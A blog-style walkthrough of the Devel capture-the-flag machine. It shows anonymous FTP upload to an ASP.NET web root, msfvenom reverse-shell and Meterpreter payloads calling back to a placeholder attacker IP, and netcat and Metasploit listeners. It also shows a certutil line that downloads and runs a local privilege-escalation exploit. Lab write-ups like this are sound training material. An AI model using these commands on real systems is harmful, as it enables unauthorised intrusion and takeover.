---
title: Devel Writeup - Hack The Box
published: 2023-08-20
description: 'A walkthrough of the Devel machine on Hack The Box, covering basic enumeration and exploitation using public exploits.'
image: './cover.jpg'
tags: [HackTheBox, Exploitation, Recon ]
category: 'HackTheBox'
draft: false
---

# TryHackMe Devel Walkthrough – Manual and Metasploit Methods

**Devel** is a beginner-friendly vulnerable machine that highlights risks caused by default configurations. It can be exploited using publicly available tools and basic enumeration.

---

## Nmap Scan

We begin with a basic `nmap` scan to discover open ports and services:

```bash
nmap -sC -sV -p- MACHINE_IP
```

![command](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*WBgz1osSej3wtX3A75LK7g.png)

From the results, we find two key open ports:

* **21 (FTP)** – with anonymous login enabled
* **80 (HTTP)** – hosting a web server

![nmap\_scan](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*mSVM4jP8kZWk0Az3tGfFmw.png)

---

## Step 1: Confirming FTP-HTTP Link

Visit the website on port 80 – a welcome image (`welcome.png`) is displayed.

![saving image](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*DFwiOUqfrPRR82WAAjGxpg.png)

We notice that this file also appears in the FTP directory. This suggests the web server pulls files directly from the FTP root.

![image\_name](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*fNod9gS3wlmIU4i23Fwudw.png)

To confirm, upload a file (`test.txt`) using anonymous FTP, then access it via the browser:

```bash
ftp MACHINE_IP
put test.txt
```

![sending \_ftp](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*Ak_UnrNV39IWApGqO18HWA.png)
![Traversing](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*CVvJNBX8QYedfqGfb8iARQ.png)

---

## Step 2: Web Tech Detection

Using Wappalyzer or similar tools, we identify the site runs **Microsoft ASP.NET**.

![wappalyzer](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*nj2optk8WvyWhY_zHRmOSw.png)

After quick research, we confirm `.aspx` is the extension in use:

![google\_search](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*yo2Nc0v8X3mHPKWIr7Oe0Q.png)

---

## Method 1: Manual Exploitation (Netcat)

Generate a reverse shell payload using `msfvenom`:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f aspx > rev.aspx
```

![msfvenom\_payload](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*Kuy1ctiK99Yl9FOucrv7TA.png)

Upload the payload via FTP:

```bash
ftp MACHINE_IP
put rev.aspx
```

![sending\_payload](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*wg2etjBDW8lN_QPOPXa8OA.png)

Start a listener:

```bash
nc -lvnp 4444
```

![netcat\_listening](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*OGK6JEvvSSgCQzGHmKkzTA.png)

Execute the payload via browser:

```
http://MACHINE_IP/rev.aspx
```

![rev.aspx](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*WqH8Ikjr2OUCFPgBHTWwtw.png)

We receive a shell as a low-privileged user:

![low\_level\_user](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*tsbsIdTKnRnHrEXOSenz5g.png)

---

## Privilege Escalation (Manual)

Run `systeminfo` to gather system details:

```bash
systeminfo
```

![systeminfo](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*a70dgV4wG9lAlfxEtnyKXw.png)

Search for known exploits using OS version info:

[Search: Windows 7 Enterprise build 7600 x86 exploit](https://www.google.com/search?q=Windows+7+Enterperise+build+7600+x86+exploit)

![exploit](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*GXdcIu6pBwxCiM8_q6_4-g.png)

Download with `searchsploit`, serve via Python:

```bash
searchsploit -m exploit/windows/local/XXXXXXXX
python3 -m http.server 80
```

![searchsploit](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*R2VeWKFOw6wW1qpWEwMxQQ.png)
![Python\_sever](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*lyeMCUukG6sm9T49Km9NCw.png)

Download and run from victim using `certutil`:

```bash
certutil -urlcache -f http://YOUR_IP/exploit.exe exploit.exe
exploit.exe
```

![downlaod\_exploit](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*1x1UCnmP8oXLteJT1nP8eg.png)

---

### Flags

**Flag 1:**
![Flag:1](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*31SwfGdmkH0-IeJpQe7MOA.png)

**Flag 2:**
![Flag:2](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*i86DS3j2sCLr02uUhWZwSA.png)

---

## Method 2: Automated Exploitation (Metasploit)

Generate a Meterpreter payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f aspx > shell.aspx
```

![payload\_creation](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*_xMRB4RpfzZmbhhA_CKn2g.png)

Upload it to the server via FTP:

![sending\_payload](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*Jlw4_4nI_Z-YprDTcuNSwA.png)

Set up Metasploit multi/handler:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
run
```

![exploit\_setting](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*D76KwkvYc5tepQxTiFWxow.png)

Trigger the shell:

```
http://MACHINE_IP/shell.aspx
```

![reverse\_shell](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*thbnALazl5syQKfBGnU6xA.png)

Get Meterpreter access:

![get\_shell](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*_dPxU7-hRRoAggKQj9UbbA.png)

Run post-exploitation module:

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

![exploit\_suggestor](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*USWEXv66U-FsdfdmqAf4GQ.png)

Exploit with `ms10_015_kitrap0d`:

![exploit\_setting](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*V7N0xKby7SDnL8yojzYM6w.png)

---

### Final Flags

**Flag 1:**
![Flag:1](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*31SwfGdmkH0-IeJpQe7MOA.png)

**Flag 2:**
![Flag:2](https://miro.medium.com/v2/resize\:fit:1400/format\:webp/1*i86DS3j2sCLr02uUhWZwSA.png)

---

## Conclusion

Devel demonstrates the risk of misconfigured services (FTP, ASP.NET) and how attackers can exploit them with simple privilege escalation techniques. Both manual and Metasploit methods highlight the same vulnerabilities but with different workflows.
